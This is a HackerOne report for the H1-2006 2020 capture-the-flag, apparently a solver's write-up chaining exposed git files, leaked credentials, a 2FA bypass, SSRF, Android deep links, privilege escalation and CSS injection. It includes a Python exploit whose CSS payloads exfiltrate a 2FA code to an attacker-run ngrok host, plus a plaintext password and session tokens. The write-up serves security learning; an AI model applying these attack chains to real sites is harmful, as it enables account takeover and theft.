{
  "id": 894949,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84OTQ5NDk=",
  "url": "https://hackerone.com/reports/894949",
  "title": "[H1-2006 2020] Exploiting multiple vulnerabilities to get hacker's payment ensured",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2020-06-09T23:39:16.020Z",
  "submitted_at": "2020-06-09T23:39:16.020Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "hecsv17",
    "url": "/hecsv17",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/iTZtwYanWLMA7Fw1o5fiKFav/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 46757,
    "url": "https://hackerone.com/h1-ctf",
    "handle": "h1-ctf",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "h1-ctf",
      "twitter_handle": "Hacker0x01",
      "website": "",
      "about": "Let's save the holidays together! #TogetherWeHitHarder"
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2020-06-18T15:25:13.183Z",
  "bug_reporter_agreed_on_going_public_at": "2020-06-18T12:41:35.600Z",
  "team_member_agreed_on_going_public_at": "2020-06-18T15:25:13.087Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Last week, Hackerone’s CEO Marten lost his credentials for BountyPay. A tweet from hackerone’s official twitter account asked for help from ethical hackers and bounty hunters to help the CEO recover his credentials and insure May’s payments.\nAs an active bug hunter on Hackerone, I decided to take on this challenge. Hey, in these times of pandemic induced quarantine, I can’t afford not to get payed for my BB hunting!\nPlus it’s a win-win: I get to get payed for my due bounties through the platform, and Marten gets the works done. And we can tweet the famous “togetherWeHitHarder” tweet again.\nSo let’s get this done.\n\n# Recon:\nAs per the usual, I started by doing a subdomain enumeration on `bountypay.h1ctf.com`, since the scope is wildcard and we want to have a vantage point on all the subdomains available on that target. That is how I discovered the five subdomains: www, app, staff, api and software.\nI started a visual recon alongside with content discovery on each one of the subdomains. From what I saw, I could make the following assumptions:\n1.\twww: is the main domain and doesn’t have any further access, it’s only for marketing and communication purposes;\n2.\tapi: a REST api with JSON output, that controls all BountyPay’s services in one place;\n3.\tstaff: is the area where BountyPay’s staff can login and communicate with each other;\n4.\tsoftware: is where the company shares useful software with its staff and customers and the access is IP-based;\n5.\tapp: is the main application where companies can log in and make bounty payments.\n\nFuzzing on all the subdomains returned no results (Bummer...), except for app.bountypay.h1ctf.com which exposes some juicy hidden git files. (Cha-ching!)\n{F861464}\n#The adventure starts:\nI downloaded all the files in the git directory, and found the following repository `https://github.com/bounty-pay-code/request-logger.git` in the config file.\nInside that repository, was a file named logger.php which stores data (IP, URI, METHOD and Params) from the server in a php array, which is then encoded by json then base64 and the output is stored in the `bp_web_trace.log` file.\nHence, the obvious next step: base64-decoding the said log file. And by doing so I came across a way in: thank you brian.oliver.\n{F861466}\nAfter successfully using the leaked credentials to login with brian, I hit 2FA.\nI tried to bypass this by sending any random ten characters alongside the challenge code inside the POST request, Miss.. \nSo I tried another approach: send any random characters with its correspondent MD5 hash, and apparently, the backend didn’t check for the validity nor the length of the sent code, it only validates if the challenge_answer parameter and the MD5 value of challenge field match.\n`Long story short: Bull’s eye !`\n{F861468}\n#Finding my way to Rome:\n\nBrowsing the application, I could only see that it shows the transactions made by the current user and those were sorted by month. \nI also noticed that a cookie named token is assigned to the session that i logged into. \nBy Base64-decoding this cookie, I find it is composed of two parts: `account_id` and hash which is NOT the MD5 hash of the provided account id. \nI tried to inject some SQL queries into the account_id parameter since there was a twitter account named @BountypayH advising to “always check for SQLi”. But no luck!\nI also noticed that sending any hash other than the one in the first request will not get any result back from the server.\n\nAt this point of the challenge I didn’t have more options to play with. So, I went back to the git repository and tried to get more information from it, but like a wise man once said, “been here, done that” so I quickly moved to test more hypothesis. \n\nThe `account_id` parameter seems to be random so I couldn’t predict or bruteforce any other valid value. \nBut reviewing Burp history, I noticed an interesting response from the server: when the transaction button is hit, the application makes a request to `api.bountypay.h1ctf.com` and gets the results of the user’s transactions at the following endpoint: `/api/accounts/F8gHiqSdpK/statements?month=01&year=2020. `\n\nAt this stage, I started to play again with `account_id` value in order to understand how the api processes the input values. So I base64-encoded the following input:  \n```{\"account_id\":\"F8gHiqSdpK/statements/?\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"} ```\n and sent it as the “token” cookie to “statements” endpoint. I got the following response: `\"data\":\"[\\\"Month and Year must be set\\\"]\"}`\n\nwhich indicates that I got my hands on some sort of an SSRF that can potentially give me access to the api without needing any credentials. \n\nHowever, since the account_id parameter is random, I couldn’t exploit it this way… \n\nFortunately, while doing the initial recon I had noticed that access to software subdomain is filtered by IP address (so it probably authorized requests from api). I also found a limited open redirect on api platform at redirect endpoint which redirects to `www.google.com` and some `bountypay.h1ctf.com` subdomains.\n To chain all this information, I had to check if I could hit redirect endpoint from statements endpoint at `app.bountypay.h1ctf.com`. After trial and error I managed to achieve this through the following input: ```{\"account_id\":\"../../redirect?url=https://software.bountypay.h1ctf.com/?\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"} ```\n{F861469}\n#Ciao Bella!\nAt this point I had access to software subdomain but it was protected by an authentication page, and since I couldn’t send credentials in GET requests, the only option I had left was to brute force files and directories to see if I could get unrestricted access to some resources.\nUsing the below python script, I was able to find uploads directory in which I found BountyPay.apk. Began the chapter “Attack on Android”..\n```\nfrom base64 import b64encode\nimport requests\nurl = \"https://app.bountypay.h1ctf.com/statements?year=2020&month=04\"\ncookies = {}\nfor s in open('wordlist', 'r').read().split('\\n'):\n    token = '{\"account_id\":\"../../redirect?url=https://software.bountypay.h1ctf.com/%s?\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}' %s\n    token = b64encode(token)\n    cookies[\"token\"] = token\n    r = requests.get(url, cookies = cookies, verify=True)\n    if \"Not Found\" not in r.text:\n        print token\n        print r.text\n```\n#Attack on Android:\n\n##Part 1:\n\nI downloaded the apk file by visiting `https://software.bountypay.h1ctf.com/uploads/BountyPay.apk`\nWhen I ran the app on my Android, It offered no interesting content, I tried to capture traffic but nothing was going on, So I decided to dig deeper.\n\nI decompiled it using apktool, and read java code using Jd-GUI.\n\nAfter a close look at the app source code and the `AndroidManifest.xml`, I noticed three main activities, each of them are invoked through a particular scheme (one,two and three respectively), and all of which had a common host=part. \n\nAfter a user is registred to the app with her/his username and twitter handle, the MainActivity will create a user_created file and store this information in user shared preferences directory.\n\nThe code responsible for the validation of the first part is as below:\n```\nString str = getIntent().getData().getQueryParameter(\"start\");\n      if (str != null && str.equals(\"PartTwoActivity\") && sharedPreferences.contains(\"USERNAME\")) \n```\nThe first part is about sending a deep link which contains start as parameter and a value of PartTwoActivity.\n\nTo further inspect the contents of the app, I decided to host this code in my server and visited the link from my android device:\n```\n<html>\n<font size=\"10\"><center><a href=\"one://part?start=PartTwoActivity\">hack them all</a></center>\n</font>\n</html>\n```\nWhich led me to Part 2.\n\n##Part 2:\n\nFrom the PartTwoActivity’s source code I noticed that an intent is created and is waiting for two parameters to make its text visible. I visited the following page with those two parameters: `two=light` and `switch=on` \n```\n<html>\n<font size=\"10\"><center><a href=\"two://part?two=light&switch=on\">hack them all</a></center>\n</font>\n</html>\n```\nAfter hitting this link, I could see an input text that expects a new value in order to validate this part (the provided value is the MD5 hash of “token” string). The `submitInfo` method has a listener on `childRef` instance which points to “header” value. On the same method, there is a public method named `onDataChange` which compares str1 and str2 strings and validate this part by writing “PARTTWO:COMPLETE” in created_user file. After entering “X-Token” value into the text field and hitting submit, Part 2 was validated.\n\n##Part 3:\nI noticed in `PartThreeActivity` that an intent is waiting for a base64 encoded values for three and switch parameters to be `UGFydFRocmVlQWN0aXZpdHk=` and `b24=` respectively. To validate this part, I needed to invoke `submitHash` method which will then invoke `correctHash` method that will trigger the `CongratsActivity`. The `submitHash` is waiting for the value of header which is no other than the value of “TOKEN” in created_user.xml file.\n```\ngeneric_x86:/data/data/bounty.pay/shared_prefs # cat user_created.xml                                                                                               \n<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n<map>\n    <string name=\"PARTTWO\">COMPLETE</string>\n    <string name=\"USERNAME\">hecsv</string>\n    <string name=\"HOST\">http://api.bountypay.h1ctf.com</string>\n    <string name=\"PARTONE\">COMPLETE</string>\n    <string name=\"TWITTERHANDLE\">@hecsv</string>\n    <string name=\"TOKEN\">8e9998ee3137ca9ade8f372739f062c1</string>\n</map>\n```\nNow, let’s get serious.\n\n#Give to Marten what belongs to Marten:\n\n##Infiltrating the staff:\nAfter the Android surrendered the TOKEN, I used it to communicate with the REST api. That is how I discovered the “api/staff” endpoint which gave me info on two staff members: Sam and Brian. \nI changed GET to POST method to see when it could get me, but it returned  [\"Missing Parameter\"], which indicated that I needed another parameter to create a new staff member. The GET method gives me the name of the missing parameter: `name` and `staff_id`. \nBut even then, I couldn’t create any valid account since it was looking for a valid `staff_id` parameter. Then a hint from the CTF creators came to the rescue. Sandra Allison which is a newly recruited staff was very happy to join BountyPay company and her tweet offered us valuable information. Her badge was showing her staff id which was the missing piece of the puzzle.\n\nUsing her credentials, I was able to login to `https://staff.bountypay.h1ctf.com`\n{F861470}\n##Privilege escalation:\n\nAfter playing around with the staff application I figured I had the following options: updating the profile and avatar, contacting admin through support section but comments were disabled and reporting any page to the admin which will be visited by the admin (except if the page started with /admin). I have tried many attacks at this stage:\n×\tsending blind XSS payloads when reporting from all pages\n×\tmodifying avatar name to xss payloads (but good filters were implemented) \n×\tchanging my name to “admin” \n×\ttrying to report a page that will update my account’s rights to admin but without starting with admin endpoint `https://staff.bountypay.h1ctf.com/admin/report?url=Ly4uL0FETUlOL3VwZ3JhZGU/dXNlcm5hbWU9c2FuZHJh`  (/../ADMIN/upgrade?username=sandra). \n\nAll of this was useless, so I had to change my approach. \n\nBack to the staff application, I found an interesting javascript file located at: `https://staff.bountypay.h1ctf.com/js/website.js`.\nA deep analysis of this file showed me that visiting `URL/#tab4` will load the hash location of that page and trigger any existing function on that page `($(\".tab4\").trigger(\"click\")))`. \nSince I wanted to trigger the `upgradeToAdmin` function, I needed a place to insert `tab4` and `upgradeToAdmin` so when I visited this page the function be triggered. Avatar name seemed like a good place to inject that payload since it will be reflected inside avatar class: ```<div style=\"margin:auto\" class=\"avatar tab4 upgradeToAdmin\"></div>```\n\nI then visited this link `https://staff.bountypay.h1ctf.com/#tab4` and indeed a GET request is sent to `admin/upgrade?username=undefined`. Here username is set to undefined because we don’t have a field with this name. After looking for a page that reflects username I discovered the following page: `https://staff.bountypay.h1ctf.com/?template=login&username=sandra.allison`. \n\nAt this point, I needed to chain these two findings, so I tried to load the two templates (home and login) on the same page using the fact that query string accepts an array parameter. So, the following request did the trick for me: `https://staff.bountypay.h1ctf.com/?template[]=home&template[]=login&username=sandra.allison`\nFinally, to update Sandra’s rights to become an “admin” I sent following request: `https://staff.bountypay.h1ctf.com/?template[]=home&template[]=login&username=sandra.allison#tab4`\n{F861471}\nAfter I got admin access, I found Marten’s password stored in plaintext: `h&H5wy2Lggj*kKn4OD&Ype` \n\nYou’re welcome, Marten!\n\n#Injecting the uninjectable!\n\nAfter logging in with Marten password on `https://app.bountypay.h1ctf.com`, I bypassed the 2FA mechanism the same way as before. \nWow! I got a smile on my face, I can make the payment now and get the flag and the invite to h1-2006 event. Wait! A 2FA challenge again is needed to make the payment, my bad!\nWell, after some recon on that part I found that we had two minutes to send a seven-character long `challenge_answer`. Brute forcing here is not a wise option since we are in lack of resources and time. I tried to send a random string with its MD5 as challenge but the challenge seems to be far more complicated.\n\nI took a step back, and noticed that `app_style` parameter is sent with a POST request when we hit the “send challenge” button. I immediately fired up my VPS and got a hit from the server with the following `User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/83.0.4103.61 HeadlessChrome/83.0.4103.61 Safari/537.36`. \nA blind SSRF in this context seems to be not applicable. \nI took a close look at the CSS file that the application is loading when visiting that link, it’s applying some styles to the body and branding “div”. So, what if I host the same file but with different value in the background-color? \nThe response was unexpected, there were no changes applied to the background of the current page! So, I made the assumption that changes are happening server side. \nAfter doing some research I came across a nice article by `d0nut` explaining CSS injection attacks `(https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d)`\nTo prove the existence of this vulnerability, I used the following css:\n``` \n*[class*=challenge]~*{\n        background:url(https://xyz.ngrok.io/challenge);\n}\n```\nThis code proves the existence of a class with name challenge.\nI needed to find the input that will contain the code that is generated by the server, I assumed that that input would start with “code” (since the challenge page is talking about sending a code) and sent the following CSS:\n```\ninput[name^=code]{\n        background:url(https://xyz.ngrok.io/code);\n}\n```\nAfter doing some brute force on the code name, I figured out that we have seven input in the form of `“code_X”` with X within [1-7].\n\n#The final exploit:\nI use the following python script to generate a css file that contains all possible alphanumeric strings combined with each code position and send them to the server, if a value exists for a particular code, the server will request our vps with `position/code_x_value`, then we parse our logs to get the whole code value . After getting the correct code,a POST request is sent through our proxy and a wonderful congratulation is printed back with the final ==FLAG=^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$==\n```\nimport string\nimport requests\nimport os, re\nfrom time import sleep\n\nngrok = \"https://3369b146412e.ngrok.io/\"\nurl = \"https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba\"\ncookies = {\"token\":\"eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9\"}\nproxies = {\"http\":\"http://localhost:8080\",\"https\":\"https://localhost:8080\"}\ncss_url = ngrok+\"tosend.css\"\ndata = {\"app_style\":css_url}\nnums = [0,1,2,3,4,5,6,7,8,9]\n\nalphanums = string.ascii_lowercase + string.ascii_uppercase + string.digits + \"+/=-_&@*$ \"\n\nregex_challenge = 'name=\"challenge\" value=\"([a-zA-Z0-9]{32})\"'\nregex_timeout = 'name=\"challenge_timeout\" value=\"([0-9]+)\"'\n\nnum = [1,2,3,4,5,6,7]\n\ndef generate_css():\n    out = ''\n\n    payload4value = '''\n    input[name^=code_%i][value=\"%s\"]{\n        background: url(%s%s);\n    }'''\n\n    for i in num:\n\tfor j in alphanums:\n        \tout += payload4value %(i,j,ngrok+str(i)+\"/\",j)\n        \tout += '\\n'\n    \n    f=open('tosend.css','w')\n    f.write(out)\n    f.close()\n\ndef execute_attack():\n\tgenerate_css()\n\tr = requests.post(url, data=data, verify=True, cookies=cookies)\n\tsleep(5)\n\tcmd = 'tail -n7 /private/var/log/apache2/access_log |cut -d\" \" -f7 |sort >/tmp/hh.txt && for i in `cat /tmp/hh.txt`; do echo $i |cut -d/ -f3;done| awk \"{print}\" ORS=\"\"'\n\tcode = os.popen(cmd).read()\n\t\n\tchallenge = re.search(regex_challenge, r.text).group(1)\n        timeout = re.search(regex_timeout, r.text).group(1)\n\tchallenge_data={\"challenge_timeout\":timeout, \"challenge\":challenge, \"challenge_answer\":code}\n        r = requests.post(url, data=challenge_data, verify=False, cookies=cookies, proxies=proxies)\n\nexecute_attack()\n```\n{F861472}\n\n## Impact\n\n#Finally\nI want to thank you for this amazing CTF, and looking forward to CTFs to come!",
  "weakness": {
    "id": 122,
    "name": "Improper Privilege Management"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 861464,
      "file_name": "Picture1.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/t4rihVB8WPhCR19aMGDdBgbC?response-content-disposition=attachment%3B%20filename%3D%22Picture1.png%22%3B%20filename%2A%3DUTF-8%27%27Picture1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6K7XUSGS%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T134707Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA5oUTkOsy%2B%2BNZW%2FsEPkxVR9Nn0bKUQajhMaZJnQUOJJAiBNVU4iwU4izaH0MK0tElopJO3KoogTT8%2FbdWX%2FkbKzuyqyBQh2EAMaDDAxMzYxOTI3NDg0OSIMERsjeYIiXpoQB0OmKo8FUViIVri3eJCOgeD2QGMLKPs4F1%2FjbhNffMNUt%2BfvAGSphgvZY2tU246xkvKwwDTX6TnzUNLh3iGOcuouArS3RIWbEfHSiDDu6%2BVZPx3Wz1I%2FCwS%2BKPH5NwJsBp0BibvHEHHji%2FALBDiXO8PioToytjyaEQNaXmQuLAn84CAb4QekxzofZnprn52iHUoXFyJNf%2Fq3ZqvA4jb30mJAxCPIjnPde1tkpNSGuAfsmY%2ByQYlN7sWxpq5yV%2BTU%2Bz0rt1WjtctGsd6w1yt88Dd%2Br74P8m7ROn2Z0ptQw5A%2BWNmX1Wanb7ILpRxe8QeaZaokqgxiSrVfnWtNKgnVUga2Z0moK4hOWv539koLmT4PBBuxJlSyZWyeMoBemGmSCiOxOKwmrf%2BCK%2FG1BpNYsaCmjPVr2A49O9rh48uqEFc8uvejj87y8pQoGWAlFjsxe1QzTC0haaEIYGygiAnZI6IKmy2%2BNlrPwjgcdHQnc15lnYbAokFqg1uW1UzqkUE4c44dN5JbBhzJaJz14CGqvz2LbrkrxeapW3SunevCGGfJdcClV%2F0zJwxxOPm7TYbX7PHfVKaL7pLvGt6ShxVaeJzf1nAj8m2nfGj9L5WdfZ6Sb9aD7w08GXkqVBejxqPrEzu%2Fin49ua4mt8x0hItGe5i0jUq8p%2BuZQ93zKwP09dFgsV6qPlGtXKwW1fddd9jt%2Bnnp1fwfIxbu4spfYa8nFjzgPqH7T%2F%2FJQgaw6dXm%2Fi4%2FblBIP3pX1Sf8fOovW1YithPw4Jt%2FdibdeIaKPPXUhJeeypNj7zindWYEDmbdjQ6xKgYfOTCGv3Kveuz%2BrIe58j5hhTO6SOGM5oLaEPjukGlkwR0S6pSULxstSwXhSCM4K2grCjC%2Fvq2uBjqyASBnlNoKKu8wzQ1P%2F0BlH14PlBBt%2Fm%2BFzSC4hnyN21lioiA3qg372zbcFqxrMin8PkMDjYnDERYVShxZWmk7L62lyLmDmK6ddoZeeuZn0a%2BBvBT61yW5%2Fafe16Wi38LTWHakxXOTJqfqznIB1OO6RKIWbBpba3WDGpf5V64%2B0hKThL7teXpfRzoD3U%2BjQs%2B7q62Fy7YrQ7qeIWla%2FIkEaOKDajC8wFKHIsPw6ZwsIvBIndQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=83b16fb4c6bd6df4ce64ce7347508f94e5fa78a0d8ba3578162de4997094bd1b",
      "file_size": 178869,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 861466,
      "file_name": "Picture2.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/VswNw4hxpf7UeFLHX7KWnwnr?response-content-disposition=attachment%3B%20filename%3D%22Picture2.png%22%3B%20filename%2A%3DUTF-8%27%27Picture2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6K7XUSGS%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T134707Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA5oUTkOsy%2B%2BNZW%2FsEPkxVR9Nn0bKUQajhMaZJnQUOJJAiBNVU4iwU4izaH0MK0tElopJO3KoogTT8%2FbdWX%2FkbKzuyqyBQh2EAMaDDAxMzYxOTI3NDg0OSIMERsjeYIiXpoQB0OmKo8FUViIVri3eJCOgeD2QGMLKPs4F1%2FjbhNffMNUt%2BfvAGSphgvZY2tU246xkvKwwDTX6TnzUNLh3iGOcuouArS3RIWbEfHSiDDu6%2BVZPx3Wz1I%2FCwS%2BKPH5NwJsBp0BibvHEHHji%2FALBDiXO8PioToytjyaEQNaXmQuLAn84CAb4QekxzofZnprn52iHUoXFyJNf%2Fq3ZqvA4jb30mJAxCPIjnPde1tkpNSGuAfsmY%2ByQYlN7sWxpq5yV%2BTU%2Bz0rt1WjtctGsd6w1yt88Dd%2Br74P8m7ROn2Z0ptQw5A%2BWNmX1Wanb7ILpRxe8QeaZaokqgxiSrVfnWtNKgnVUga2Z0moK4hOWv539koLmT4PBBuxJlSyZWyeMoBemGmSCiOxOKwmrf%2BCK%2FG1BpNYsaCmjPVr2A49O9rh48uqEFc8uvejj87y8pQoGWAlFjsxe1QzTC0haaEIYGygiAnZI6IKmy2%2BNlrPwjgcdHQnc15lnYbAokFqg1uW1UzqkUE4c44dN5JbBhzJaJz14CGqvz2LbrkrxeapW3SunevCGGfJdcClV%2F0zJwxxOPm7TYbX7PHfVKaL7pLvGt6ShxVaeJzf1nAj8m2nfGj9L5WdfZ6Sb9aD7w08GXkqVBejxqPrEzu%2Fin49ua4mt8x0hItGe5i0jUq8p%2BuZQ93zKwP09dFgsV6qPlGtXKwW1fddd9jt%2Bnnp1fwfIxbu4spfYa8nFjzgPqH7T%2F%2FJQgaw6dXm%2Fi4%2FblBIP3pX1Sf8fOovW1YithPw4Jt%2FdibdeIaKPPXUhJeeypNj7zindWYEDmbdjQ6xKgYfOTCGv3Kveuz%2BrIe58j5hhTO6SOGM5oLaEPjukGlkwR0S6pSULxstSwXhSCM4K2grCjC%2Fvq2uBjqyASBnlNoKKu8wzQ1P%2F0BlH14PlBBt%2Fm%2BFzSC4hnyN21lioiA3qg372zbcFqxrMin8PkMDjYnDERYVShxZWmk7L62lyLmDmK6ddoZeeuZn0a%2BBvBT61yW5%2Fafe16Wi38LTWHakxXOTJqfqznIB1OO6RKIWbBpba3WDGpf5V64%2B0hKThL7teXpfRzoD3U%2BjQs%2B7q62Fy7YrQ7qeIWla%2FIkEaOKDajC8wFKHIsPw6ZwsIvBIndQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3b7ce732e189d796bbab68f500bdab5155d28fd51f7e9d7b43aacc48ef01bca1",
      "file_size": 117137,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 861468,
      "file_name": "Picture3.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/8QvPKWLVv95rgyv2vmpktif5?response-content-disposition=attachment%3B%20filename%3D%22Picture3.png%22%3B%20filename%2A%3DUTF-8%27%27Picture3.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6K7XUSGS%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T134707Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA5oUTkOsy%2B%2BNZW%2FsEPkxVR9Nn0bKUQajhMaZJnQUOJJAiBNVU4iwU4izaH0MK0tElopJO3KoogTT8%2FbdWX%2FkbKzuyqyBQh2EAMaDDAxMzYxOTI3NDg0OSIMERsjeYIiXpoQB0OmKo8FUViIVri3eJCOgeD2QGMLKPs4F1%2FjbhNffMNUt%2BfvAGSphgvZY2tU246xkvKwwDTX6TnzUNLh3iGOcuouArS3RIWbEfHSiDDu6%2BVZPx3Wz1I%2FCwS%2BKPH5NwJsBp0BibvHEHHji%2FALBDiXO8PioToytjyaEQNaXmQuLAn84CAb4QekxzofZnprn52iHUoXFyJNf%2Fq3ZqvA4jb30mJAxCPIjnPde1tkpNSGuAfsmY%2ByQYlN7sWxpq5yV%2BTU%2Bz0rt1WjtctGsd6w1yt88Dd%2Br74P8m7ROn2Z0ptQw5A%2BWNmX1Wanb7ILpRxe8QeaZaokqgxiSrVfnWtNKgnVUga2Z0moK4hOWv539koLmT4PBBuxJlSyZWyeMoBemGmSCiOxOKwmrf%2BCK%2FG1BpNYsaCmjPVr2A49O9rh48uqEFc8uvejj87y8pQoGWAlFjsxe1QzTC0haaEIYGygiAnZI6IKmy2%2BNlrPwjgcdHQnc15lnYbAokFqg1uW1UzqkUE4c44dN5JbBhzJaJz14CGqvz2LbrkrxeapW3SunevCGGfJdcClV%2F0zJwxxOPm7TYbX7PHfVKaL7pLvGt6ShxVaeJzf1nAj8m2nfGj9L5WdfZ6Sb9aD7w08GXkqVBejxqPrEzu%2Fin49ua4mt8x0hItGe5i0jUq8p%2BuZQ93zKwP09dFgsV6qPlGtXKwW1fddd9jt%2Bnnp1fwfIxbu4spfYa8nFjzgPqH7T%2F%2FJQgaw6dXm%2Fi4%2FblBIP3pX1Sf8fOovW1YithPw4Jt%2FdibdeIaKPPXUhJeeypNj7zindWYEDmbdjQ6xKgYfOTCGv3Kveuz%2BrIe58j5hhTO6SOGM5oLaEPjukGlkwR0S6pSULxstSwXhSCM4K2grCjC%2Fvq2uBjqyASBnlNoKKu8wzQ1P%2F0BlH14PlBBt%2Fm%2BFzSC4hnyN21lioiA3qg372zbcFqxrMin8PkMDjYnDERYVShxZWmk7L62lyLmDmK6ddoZeeuZn0a%2BBvBT61yW5%2Fafe16Wi38LTWHakxXOTJqfqznIB1OO6RKIWbBpba3WDGpf5V64%2B0hKThL7teXpfRzoD3U%2BjQs%2B7q62Fy7YrQ7qeIWla%2FIkEaOKDajC8wFKHIsPw6ZwsIvBIndQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=30f3dff377633166dfb6eaf0d6dcd0a4b1d979c3c3e7553a21431d6dfce20ed4",
      "file_size": 128302,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 861469,
      "file_name": "Picture4.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/YbgPAtRNNti1dk41XdVnguHE?response-content-disposition=attachment%3B%20filename%3D%22Picture4.png%22%3B%20filename%2A%3DUTF-8%27%27Picture4.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6K7XUSGS%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T134707Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA5oUTkOsy%2B%2BNZW%2FsEPkxVR9Nn0bKUQajhMaZJnQUOJJAiBNVU4iwU4izaH0MK0tElopJO3KoogTT8%2FbdWX%2FkbKzuyqyBQh2EAMaDDAxMzYxOTI3NDg0OSIMERsjeYIiXpoQB0OmKo8FUViIVri3eJCOgeD2QGMLKPs4F1%2FjbhNffMNUt%2BfvAGSphgvZY2tU246xkvKwwDTX6TnzUNLh3iGOcuouArS3RIWbEfHSiDDu6%2BVZPx3Wz1I%2FCwS%2BKPH5NwJsBp0BibvHEHHji%2FALBDiXO8PioToytjyaEQNaXmQuLAn84CAb4QekxzofZnprn52iHUoXFyJNf%2Fq3ZqvA4jb30mJAxCPIjnPde1tkpNSGuAfsmY%2ByQYlN7sWxpq5yV%2BTU%2Bz0rt1WjtctGsd6w1yt88Dd%2Br74P8m7ROn2Z0ptQw5A%2BWNmX1Wanb7ILpRxe8QeaZaokqgxiSrVfnWtNKgnVUga2Z0moK4hOWv539koLmT4PBBuxJlSyZWyeMoBemGmSCiOxOKwmrf%2BCK%2FG1BpNYsaCmjPVr2A49O9rh48uqEFc8uvejj87y8pQoGWAlFjsxe1QzTC0haaEIYGygiAnZI6IKmy2%2BNlrPwjgcdHQnc15lnYbAokFqg1uW1UzqkUE4c44dN5JbBhzJaJz14CGqvz2LbrkrxeapW3SunevCGGfJdcClV%2F0zJwxxOPm7TYbX7PHfVKaL7pLvGt6ShxVaeJzf1nAj8m2nfGj9L5WdfZ6Sb9aD7w08GXkqVBejxqPrEzu%2Fin49ua4mt8x0hItGe5i0jUq8p%2BuZQ93zKwP09dFgsV6qPlGtXKwW1fddd9jt%2Bnnp1fwfIxbu4spfYa8nFjzgPqH7T%2F%2FJQgaw6dXm%2Fi4%2FblBIP3pX1Sf8fOovW1YithPw4Jt%2FdibdeIaKPPXUhJeeypNj7zindWYEDmbdjQ6xKgYfOTCGv3Kveuz%2BrIe58j5hhTO6SOGM5oLaEPjukGlkwR0S6pSULxstSwXhSCM4K2grCjC%2Fvq2uBjqyASBnlNoKKu8wzQ1P%2F0BlH14PlBBt%2Fm%2BF